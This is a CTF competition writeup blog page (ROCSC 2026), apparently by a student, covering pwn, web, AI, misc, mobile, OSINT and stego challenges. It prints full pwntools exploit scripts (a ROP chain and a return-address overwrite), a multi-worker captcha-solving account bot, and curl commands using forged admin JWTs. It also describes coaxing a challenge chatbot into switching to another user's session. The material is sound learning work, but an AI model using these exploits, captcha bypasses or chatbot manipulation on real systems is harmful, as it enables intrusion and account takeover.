@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ROCSC 2026 | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="ctf">
+<meta name="description" content="Intro
+This year&rsquo;s ROCSC was my first participation, and I ended up ranking 50, so I&rsquo;m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me did qualify, so I&rsquo;m a bit salty about that.
+What was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges were solvable using AI; just mindlessly pumping challenges into Claude and GPT isn&rsquo;t fun, but not doing so puts you at a great disadvantage to people who do so.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/rocsc2026/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/rocsc2026/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/rocsc2026/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="ROCSC 2026">
+  <meta property="og:description" content="Intro This year’s ROCSC was my first participation, and I ended up ranking 50, so I’m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me did qualify, so I’m a bit salty about that.
+What was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges were solvable using AI; just mindlessly pumping challenges into Claude and GPT isn’t fun, but not doing so puts you at a great disadvantage to people who do so.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-23T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROCSC 2026">
+<meta name="twitter:description" content="Intro
+This year&rsquo;s ROCSC was my first participation, and I ended up ranking 50, so I&rsquo;m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me did qualify, so I&rsquo;m a bit salty about that.
+What was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges were solvable using AI; just mindlessly pumping challenges into Claude and GPT isn&rsquo;t fun, but not doing so puts you at a great disadvantage to people who do so.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ROCSC 2026",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/rocsc2026/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ROCSC 2026",
+  "name": "ROCSC 2026",
+  "description": "Intro This year\u0026rsquo;s ROCSC was my first participation, and I ended up ranking 50, so I\u0026rsquo;m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me did qualify, so I\u0026rsquo;m a bit salty about that.\nWhat was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges were solvable using AI; just mindlessly pumping challenges into Claude and GPT isn\u0026rsquo;t fun, but not doing so puts you at a great disadvantage to people who do so.\n",
+  "keywords": [
+    "ctf"
+  ],
+  "articleBody": "Intro This year’s ROCSC was my first participation, and I ended up ranking 50, so I’m pretty proud about my performance. Sadly, the competition was crazy in the junior section, as the only people who qualified were those with a full solve, which almost never happens. But seniors ranked below me did qualify, so I’m a bit salty about that.\nWhat was unfortunate was the AI thing, which essentially made this pay-to-win, since most challenges were solvable using AI; just mindlessly pumping challenges into Claude and GPT isn’t fun, but not doing so puts you at a great disadvantage to people who do so.\nEither way, this was a great learning experience and 3 very long days with very little sleep. So here is what I solved and how.\nPwn I’ll start with pwn because it’s my favorite and what I solved first.\nropy ropy was a simple enough ORW pwn challenge, which means we aren’t allowed to execute any syscalls except open, read and write. Yet that is enough to read the flag.\nBut there was a fun twist which was the first function called, opening a huge random amount of fd (file descriptors). To read from flag.txt in the first place, we need to pass its fd as a parameter. Since it wasn’t the usual 3, the only way to actually get it, without guessing, was through the return value of open(flag.txt), passed in rax.\nTo make this even more challenging, we only get a bunch of shit gadgets, all of which in libc.so.6, except for a pop rdi; ret to start the gadget chain from main.\nSo the action plan was:\nwrite “flag.txt” into bss open(“flag.txt”, 0, 0) retrieve rax, read(fd, bss+20, 100) write(1(stdout), bss+20, 100). With that in mind, here is the full script I used, which worked first try!\nfrom pwn import * elf = ELF('./main') p=elf.process() cyberedu = '34.40.29.248:30946' ip, port = cyberedu.split(':') port = int(port) if args.REMOTE: p = remote(ip, port) else: p = elf.process() #avem doar read write open, flag.txt e chiar langa binary; #main #pop rdi; rei pop_rdi_ret = 0x401316 ret = 0x40101a puts_plt = 0x401150 puts_got = elf.got['puts'] puts_offset = 0x80e50 vuln = 0x401566 #bss flag_str = 0x04040c0 flag_buf = 0x404200 # past BSS, writable page # get libc for gadgets; p.recvuntil(b\"?\\n\") #v1 payload = b\"A\"*128 #rbp payload += b\"B\"*8 payload += p64(pop_rdi_ret) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(ret) payload += p64(vuln) p.sendline(payload) data = p.recvline().strip() val = u64(data.ljust(8, b\"\\x00\")) print(hex(val)) libc = val - puts_offset print(f\"Libc: {hex(libc)}\") #second gadget chain p.recvuntil(b\"?\\n\") #v1 payload = b\"A\"*128 #rbp payload += b\"B\"*8 #gadgets from libc syscall = 0x29db4 + libc syscall_ret = 0x91316 + libc pop_rsi_ret = 0x2be51 +libc pop_rdx_r12_ret = 0x011f357 + libc mov_addr_rdx_rax_ret = 0x03a410 + libc pop_rax_ret = 0x45eb0 + libc pop_rcx_ret = 0x3d1ee + libc pop_r8_mov_eax_1_ret = 0x165a56 + libc #0x000000000005a272: mov rdi, rax; cmp rdx, rcx; jae 0x5a25c; mov rax, r8; ret; #yeah i know shut up mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret = 0x5a272 + libc #write to bss \"flag.txt\\0\\0\" to prepare for open payload += p64(pop_rax_ret) payload += p64(0x7478742e67616c66) # \"flag.txt\" payload += p64(pop_rdx_r12_ret) payload += p64(flag_str) payload += p64(0x0) payload += p64(mov_addr_rdx_rax_ret) # write null terminator (next 8 bytes = 0) payload += p64(pop_rax_ret) payload += p64(0) payload += p64(pop_rdx_r12_ret) payload += p64(flag_str + 8) payload += p64(0x0) payload += p64(mov_addr_rdx_rax_ret) # [flag_str+8] = 0x00... #open # open(\"flag.txt\", O_RDONLY) payload += p64(pop_rdi_ret) payload += p64(flag_str) payload += p64(pop_rsi_ret) payload += p64(0) # O_RDONLY payload += p64(pop_rax_ret) payload += p64(2) # SYS_open payload += p64(syscall_ret) # rax = fd (unknown high number) #so now we need to store that fd; #prepping for the weird gadget's conditions, so we dont jmp smwhere else payload += p64(pop_rcx_ret) payload += p64(0xffffffff) payload += p64(pop_rdx_r12_ret) payload += p64(0) payload += p64(0) #for now lets leave r8 alone; # turns out it was ok, didnt even need to modify it payload += p64(mov_rdi_rax_cmp_rdx_rcx_jae_5a25c_mov_rax_r8_ret) #now rdi = fd # just pop rax = 0 right after payload += p64(pop_rax_ret) payload += p64(0) # SYS_read # now straight into read syscall payload += p64(pop_rsi_ret) payload += p64(flag_buf) payload += p64(pop_rdx_r12_ret) payload += p64(100) payload += p64(0) payload += p64(syscall_ret) # read(fd, flag_buf, 100) #now write # write(1, flag_buf, 100) payload += p64(pop_rdi_ret) payload += p64(1) payload += p64(pop_rsi_ret) payload += p64(flag_buf) payload += p64(pop_rdx_r12_ret) payload += p64(100) payload += p64(0) payload += p64(pop_rax_ret) payload += p64(1) # SYS_write payload += p64(syscall_ret) p.sendline(payload) p.interactive() directory This one was also particularly interesting, but I didn’t really understand how the stack layout looked properly, and I’ll explain why in a minute.\nWe had a menu, with options, out of which are interesting:\nExit and return Add entry to directory (overflow, we can write 48 bytes instead of 20 or sth) We can add up to 9 entries, each at memcpy(\u0026v2[20 * v1++ + 264], v2, v4[0]);.\nBut looking at the stack layout, this just completely overflows v2, and by the third entry we should already be writing to v2 + 320 where rip lives. Since we have a win function, we just need to change rip’s lower bytes to 1537, and that would be enough.\nBut that wasn’t the case, so either my math was wrong or IDA was wrong or whatever. But luckily, we can use gef. I determined that we only start writing into rip in the very last entry, so we just add 8 entries and in the 9th we can start our overflow. Again, I determined the exact value of padding through testing and not math.\nBut here’s a catch, since ASLR + PIE, the 1537 offset of win meant that the 1 part of it could end up as any value. And to avoid a segmentation fault because of stack alignment, we needed a v538 to be more exact.\nI used 4538 but you get the idea; the script worked in about 10-20 tries when ASLR happened to make that byte 0x45.\nfrom pwn import * context.binary = elf = ELF(\"./directory\") context.log_level = \"info\" p = remote('34.179.142.75', 31046) def add(data): p.sendlineafter(b\"\u003e \", b\"1\") p.sendafter(b\"Enter name:\", data) def exit_prog(): p.sendlineafter(b\"\u003e \", b\"4\") #mai intai adaugam cv random add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) add(b\"A\"*48) #the 4 bytes of rbp there yea add(b\"C\"*36 + b\"D\"*4 + p16(0x4538)) p.interactive() Web Y The intended solve for this was through XSS through CSS, and somehow getting the admin to send us html data from one of his pages. But the author forgot to change his JWT secret in the source code so we can just forge our own cookie with the admin’s user id.\nopen-tellmewhy This was another interesting one, a stored XSS challenge, in open-webui version 6.5. Searching for CVEs found in that specific version, we bump into this one.\nThe only thing we needed to modify was the ${WEBUI_BASE_URL}, which was just \"\" (I mean empty). We just report the page and fetch the admin’s token, and log in as him (or her!).\nThe flag was here:\nI was genuinely so happy when I finally solved this.\nML/AI Sadly I didn’t solve this in time, I was pretty close, I found out the hidden sessions, but the lack of sleep finally caught up to me at 5 am and I told myself I’d do it in the morning at 9 (yeah right).\nWhat was happening that threw me off was that only sometimes the AI would actually change our session to a specified id. The reason is because I was saying ‘switch me to session ’ instead of ‘switch me to ’. Yeah, I know.\nAsking to list sessions would list all the sessions, and the lucky one was m3n4o5p6. Refreshing the page after getting the token showed all previous messages.\nThe flag was ctf{4620c10465bb2c85c2bc9804972bb75c1d72a4782100d09d1a0bb72eb576b772}.\nMisc clanker casino Another really interesting challenge - we log into an account starting with 1 coin. We can bet any number of our coins, with the clanker casino policy of double-or-nothing.\nThe catch here was a captcha (hahaha get it), with a simple sum of two numbers that was rendered differently than the one in the HTML. And of course, to not bot, the rendered one was correct. So I had Claude Premium code us a playwright bot (which can see rendered) with a bunch of threads – because I didn’t get a 32GB RAM laptop for nothing – that logs in on a new account, with this betting logic:\ndef get_bet(coins): if coins \u003e= 160: return max(1, 200 - coins) if coins \u003c= 4: return coins if coins \u003c 16: return 2 if coins \u003c 40: return 2 if coins \u003c 80: return 4 return 16 Another hurdle was the font, editundo.ttf, with crappy, unique and hard to recognize numbers and symbols.\nNow, Claude was really clever with this; It used pixel fingerprinting. Playwright takes a screensot of just the .captcha-container element, turns it to black and white and puts each dark pixel area inside a box.\nIf it finds a fully white column in the image, it considers it as a space between characters, and slices out each character as a separate image (17x26). Then, it’s converted into this binary tuple (I know it sounds a little complicated but it’s just a hash with 0 or 1 for each pixel, so it produces a special hash for each of the characters to recognize them faster).\nAlso the symbol in the middle was always regarded as a plus.\nThen, it looks it up in a DIGIT_MAP. This DIGIT_MAP is essentially an array of all these hashes. It starts as empty, and it displays each character in ASCII in the terminal for the user to write what the number character is, if it hasn’t seen it before.\nThen, when the map is done, the Playwright friend of our can bypass the captcha by itself, and, you’ll get the flag at 200 coins!\nThis script launched 10 workers and got the flag in seconds. But depending on your luck, it could take longer.\nimport re import asyncio import itertools import numpy as np from PIL import Image import io from playwright.async_api import async_playwright BASE = \"http://34.185.144.221:31082\" NUM_WORKERS = 10 DIGIT_MAP = {} map_lock = asyncio.Lock() input_lock = asyncio.Lock() flag_found = asyncio.Event() # Each worker gets its own counter in a completely separate range # Worker 1: 11000100, 11000101, ... # Worker 2: 22000200, 22000201, ... # etc. def make_counter(worker_id): return itertools.count(worker_id * 11000100) def check_flag(text): for pattern in [r'ctf\\{.*?\\}', r'ROCSC\\{.*?\\}', r'CTF\\{.*?\\}', r'FLAG\\{.*?\\}']: match = re.search(pattern, text, re.IGNORECASE) if match: return match.group() return None def extract_segments(screenshot_bytes): img = Image.open(io.BytesIO(screenshot_bytes)).convert('L') inner = img.crop((3, 3, img.width-3, img.height-3)) arr = np.array(inner) \u003c 50 rows = np.any(arr, axis=1) cols = np.any(arr, axis=0) if not rows.any(): return [], None rmin, rmax = np.where(rows)[0][[0, -1]] cmin, cmax = np.where(cols)[0][[0, -1]] cropped = arr[max(0,rmin-2):rmax+2, max(0,cmin-2):cmax+2] col_proj = np.sum(cropped, axis=0) in_char = False segments = [] start = 0 for x in range(len(col_proj)): if not in_char and col_proj[x] \u003e 0: in_char = True; start = x elif in_char and col_proj[x] == 0: in_char = False; segments.append([start, x]) if in_char: segments.append([start, len(col_proj)]) if not segments: return [], None # Captcha is always exactly 5 chars: D D + D D # Merge closest pairs until we have exactly 5 while len(segments) \u003e 5: gaps = [segments[i+1][0] - segments[i][1] for i in range(len(segments)-1)] min_idx = gaps.index(min(gaps)) segments[min_idx][1] = segments[min_idx+1][1] segments.pop(min_idx+1) return [cropped[:, x1:x2] for x1, x2 in segments], cropped def seg_to_hash(seg): img = Image.fromarray(seg.astype(np.uint8) * 255) img = img.resize((17, 26), Image.NEAREST) return tuple(np.array(img).flatten() \u003e 128) def decode_captcha(screenshot_bytes): segs, _ = extract_segments(screenshot_bytes) if not segs: return None, [] result = '' unknowns = [] for i, seg in enumerate(segs): # Position 2 (middle of 5) is always the + sign if i == 2: result += '+' continue h = seg_to_hash(seg) if h in DIGIT_MAP: result += DIGIT_MAP[h] else: result += '?' unknowns.append((i, seg, h)) return result, unknowns def seed_from_known_captcha(): try: with open('captcha_test.png', 'rb') as f: data = f.read() segs, _ = extract_segments(data) known = ['0', '9', '+', '9', '2'] if len(segs) == len(known): for seg, label in zip(segs, known): DIGIT_MAP[seg_to_hash(seg)] = label print(f\"[+] Seeded map: {set(known)} ({len(DIGIT_MAP)} entries)\") else: print(f\"[-] Seed failed: expected 5 segs, got {len(segs)}\") except FileNotFoundError: print(\"[-] captcha_test.png not found, will learn interactively\") async def learn_unknown(seg, h, worker_id): async with input_lock: if h in DIGIT_MAP: return DIGIT_MAP[h] print(f\"\\n[W{worker_id}] Unknown character:\") for row in seg: print(' ' + ''.join('██' if p else ' ' for p in row)) print(f\" What digit/char is this? \", end='', flush=True) label = await asyncio.get_event_loop().run_in_executor(None, input) label = label.strip() if label: DIGIT_MAP[h] = label print(f\" [+] Learned '{label}' (map: {len(DIGIT_MAP)} entries)\") return label def get_bet(coins): if coins \u003e= 100: return max(1, 200 - coins) # one win reaches 200 return max(1, coins // 2) # bet half, fast growth async def worker(worker_id, browser): counter = make_counter(worker_id) async def new_session(): idx = next(counter) context = await browser.new_context() page = await context.new_page() await page.goto(f\"{BASE}/register\") await page.fill('input[name=\"username\"]', str(idx)) await page.fill('input[name=\"password\"]', str(idx)) await page.click('button[type=\"submit\"]') print(f\"[W{worker_id}] New account: {idx}\") return context, page context, page = await new_session() while not flag_found.is_set(): await page.goto(f\"{BASE}/game\") html = await page.content() flag = check_flag(html) if flag: print(f\"\\n[W{worker_id}] 🚩 FLAG: {flag}\") flag_found.set() break hud_text = await page.inner_text('.hud') m = re.search(r'COINS: (\\d+)', hud_text) if not m: continue coins = int(m.group(1)) if coins == 0: print(f\"[W{worker_id}] Busted!\") await context.close() context, page = await new_session() continue element = await page.query_selector('.captcha-container') screenshot_bytes = await element.screenshot() decoded, unknowns = decode_captcha(screenshot_bytes) if unknowns: for uidx, seg, h in unknowns: if h in DIGIT_MAP: continue label = await learn_unknown(seg, h, worker_id) if not label: break decoded, unknowns = decode_captcha(screenshot_bytes) if not decoded or '?' in decoded: continue match = re.search(r'(\\d+)\\+(\\d+)', decoded) if not match: continue solution = int(match.group(1)) + int(match.group(2)) bet = get_bet(coins) print(f\"[W{worker_id}] Coins:{coins} | {decoded}={solution} | bet:{bet} | map:{len(DIGIT_MAP)}\") await page.fill('input[name=\"bet\"]', str(bet)) await page.fill('input[name=\"captcha_answer\"]', str(solution)) await page.click('button[type=\"submit\"]') html = await page.content() flag = check_flag(html) if flag: print(f\"\\n[W{worker_id}] 🚩 FLAG: {flag}\") flag_found.set() break try: flash = (await page.inner_text('.flash')).strip() print(f\"[W{worker_id}] =\u003e {flash}\") except: pass await context.close() async def main(): seed_from_known_captcha() async with async_playwright() as p: browser = await p.chromium.launch(headless=True) print(f\"[+] Launching {NUM_WORKERS} workers...\") tasks = [asyncio.create_task(worker(i+1, browser)) for i in range(NUM_WORKERS)] await flag_found.wait() for t in tasks: t.cancel() await asyncio.gather(*tasks, return_exceptions=True) await browser.close() asyncio.run(main()) jail Shamelessly I will admit Claude Premium clutched this, with absolutely zero human intervention. I didn’t even bother figuring out why this was vulnerable here.\nNetwork Chimera Void We get a pcap that we don’t even need to open for this challenge, genuinely. If we take all the strings, first we get a bunch of ‘A’s for obfuscation I suppose, then data that looks like this: G1 F1200 X40.000 Y80.800 E310291.75000. A bit of research, and we find it is G-codes. This writeup on a similar challenge was very useful.\nG-codes are data for 3d printers, so we just need an online-no-kali-install-please-gcode-emulator. I tried a bunch of websites which rendered like shit until I found this winner.\nThe command I used was strings chimera_void.pcap | grep -v '^A' \u003e gcode.txt, and just popped the file into the mesh inspector. And here is the flag!\nAnd written out, CTF{CONGRATS_WINNERS}.\nMobile I’m not really experienced with mobile rev, so these were purely vibe-coded (vibe-hacked?).\navault I just gave Claude the apk and it made great progress. It figured out we needed a bunch of headers, and that the password needed to be “R4M_$tonks”. These are the working commands it had me run, in order:\ncurl -k -H 'A-VALUT: x-monitor-client-921754' \\ https://34.185.140.241:31454/anon ANON=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpYXQiOjE3NzE4NjUyNTIsImV4cCI6MTc3MTg2ODg1Mn0.LugXX6JwCpxTR-9fWkQzuVNZuu-Cy-IXtMeZlVIdk5Q\" curl -k -X POST https://34.185.140.241:31454/login \\ H 'Content-Type: application/json' \\ H 'A-VALUT: x-monitor-client-921754' \\ H \"Authorization: Bearer $ANON\" \\ d '{\"password\": \"R4M_$tonks\"}' JWT=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiY2xpZW50IjoiYW5kcm9pZF9jbGllbnQiLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NzE4NjU0MTYsImV4cCI6MTc3MTg2OTAxNn0.HbdBDPbDzrMitfdK1PBRTF-FpiRml9btInZRhNw9N_0\" curl -k https://34.185.140.241:31454/feed \\ -H 'A-VALUT: x-monitor-client-921754' \\ -H \"Authorization: Bearer $JWT\" curl -k -X POST https://34.185.140.241:31454/security/options \\ -H 'Content-Type: application/json' \\ -H 'A-VALUT: x-monitor-client-921754' \\ -H \"Authorization: Bearer $JWT\" \\ -d '{\"door\": \"open\"}' curl -k -o feed_output https://34.185.140.241:31454/feed \\ -H 'A-VALUT: x-monitor-client-921754' \\ -H \"Authorization: Bearer $JWT\" And we get a png file:\nSince the image was also generated by AI I didn’t feel that bad for my very little human intervention.\nIn search of the lost note So not just mobile, but also cryptography, how nice. This one was done COMPLETELY by ChatGPT Premium in half an hour.\nBut I’ll still try to explain what exactly happens here. We already knew this, from the jadx-gui decompiled code:\npassword = pin + \":\" + pepper key = PBKDF2-HMAC-SHA256( password, salt, iterations = 150000, dkLen = 32 bytes ) The first thing served to us is the salt in security.xml. So we just needed to find out pepper and pin. And the nonce is derived from the Ts (timestamp).\npublic final byte[] nonceFromTs(long ts) { byte[] b = new byte[16]; long v = ts; for (int i = 0; i \u003c 8; i++) { b[i] = (byte) (255 \u0026 v); v \u003e\u003e\u003e= 8; } byte[] h = sha256(ArraysKt.plus(new byte[]{110, 111}, b)); return ArraysKt.copyOfRange(h, 0, 12); } More exactly:\nThe nonce will look like this: nonce = SHA256( b\"no\" || (LE64(ts) || 8*0x00) )[0:12];\nA payload is generated like this: payload = AES-GCM(key, nonce, plaintext);\nThe decryption looks like this: plaintext = AES-GCM-decrypt(key, nonceFromTs(created_at), payload).\nThen, the note we were looking for, even though it was deleted from the main DB, can still be retrieved through notes.db-wal. WAL stands for Write-Ahead Log, which is a journal mode in SQLite. So it’s just a log file.\nBecause our app forces PRAGMA wal_autocheckpoint=0;, the WAL doesn’t get refreshed and data just keeps piling on. This is important because it stores both created_at and ciphertext (AKA FLAG!).\nAnd since only one note was deleted from the db it was pretty obvious which one we needed to use (and yeah, the challenge name too).\nSo the password - PBKDF2(pin + \":\" + pepper, salt). The 8 digit pin is just a date, since there’s dates on notes, which was just bruteforced from 1990 to 2025, as that’s where most the notes were from.\nNow, about pepper, which can be reverse engineered from libcnative.so. It found it like so: objdump -d -M intel app_unzipped/lib/x86_64/libnative.so | grep -n \"Native_pepper\".\nAnd the decompiled code was:\nfor (i=0; i\u003cLEN; i++) out[i] = enc[i] ^ 0x5A; out[LEN] = 0; return (*env)-\u003eNewStringUTF(env, out); So just a simple xor! Lucky ChatGPT. The encoded pepper was in .rodata, and it just xor-ed it to decode it. And now, everything is complete, and we can decode the flag ciphertext!\nOSINT museum We’re supposed to find the museum in which an art piece is located.\nWith a simple reverse search on the image we find a similar one with the same piece in some blog, including the building with the museum’s name.\nThe flag: ROCSC{sichuan_science_and_technology_museum}\nwonderful-strangers We find memepie67 on roblox, following just one guy hinting to his youtube channel in his description, with a video of him reading out the flag character by character. The video.\nFlag: ROCSC{h0w_d0e5_h3_m0v3_l1k3_th1s}\nart-gallery-heist-2 We’re given a picture of an NFT, and through reverse search we find it belongs to the Ocean Racer League collection. By searching it on polygon, I found its owner’s wallet address, 0xe31f336e1a6983c1a77e1ff7edeaaac1e5d088d3.\nSearching it in github, we find a repo with someone asking for donations at that address, unchainedmf. His bio hints at his Twitter account, which had posted the flag in base64.\nThis challenge took me way more than it looks, and in the process I thought I had to purchase one of the NFTs in the collection to join their discord server with a wallet verification bot. So here is my beautiful 0.3$ NFT in my portfolio:\nAnd the flag was ROCSC{n0_ch@in_c@n_ev3r_h0ld_me_d0wn}.\nSteganography echoes_of_the_past This one as another one of ChatGPT’s artworks. And having done strings, we see that Past Date=06.07.2022.\nGoing into Internet Archive at that specific data in that specific website, we see a user trying to log in.\nsha256-ing the username, we get the flag: ROCSC{2a97516c354b68848cdbd8f54a226a0a55b21ed138e207ad6c5cbb9c00aa5aea}.\nThank you for reading! The longer python scripts I made can be found here.\n",
+  "wordCount" : "3318",
+  "inLanguage": "en",
+  "datePublished": "2026-02-23T00:00:00Z",
+  "dateModified": "2026-02-23T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/rocsc2026/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      ROCSC 2026
+    </h1>
+    <div class="post-meta"><span title='2026-02-23 00:00:00 +0000 UTC'>February 23, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#intro" aria-label="Intro">Intro</a></li>
+                <li>
+                    <a href="#pwn" aria-label="Pwn">Pwn</a><ul>
+                        
+                <li>
+                    <a href="#ropy" aria-label="ropy">ropy</a></li>
+                <li>
+                    <a href="#directory" aria-label="directory">directory</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web" aria-label="Web">Web</a><ul>
+                        
+                <li>
+                    <a href="#y" aria-label="Y">Y</a></li>
+                <li>
+                    <a href="#open-tellmewhy" aria-label="open-tellmewhy">open-tellmewhy</a></li></ul>
+                </li>
+                <li>
+                    <a href="#mlai" aria-label="ML/AI">ML/AI</a></li>
+                <li>
+                    <a href="#misc" aria-label="Misc">Misc</a><ul>
+                        
+                <li>
+                    <a href="#clanker-casino" aria-label="clanker casino">clanker casino</a></li>
+                <li>
+                    <a href="#jail" aria-label="jail">jail</a></li></ul>
+                </li>
+                <li>
+                    <a href="#network" aria-label="Network">Network</a><ul>
+                        
+                <li>
+                    <a href="#chimera-void" aria-label="Chimera Void">Chimera Void</a></li></ul>
+                </li>
+                <li>
+                    <a href="#mobile" aria-label="Mobile">Mobile</a><ul>
+                        
+                <li>
+                    <a href="#avault" aria-label="avault">avault</a></li>
+                <li>
+                    <a href="#in-search-of-the-lost-note" aria-label="In search of the lost note">In search of the lost note</a></li></ul>
+                </li>
+                <li>
+                    <a href="#osint" aria-label="OSINT">OSINT</a><ul>
+                        
+                <li>
+                    <a href="#museum" aria-label="museum">museum</a></li>
+                <li>
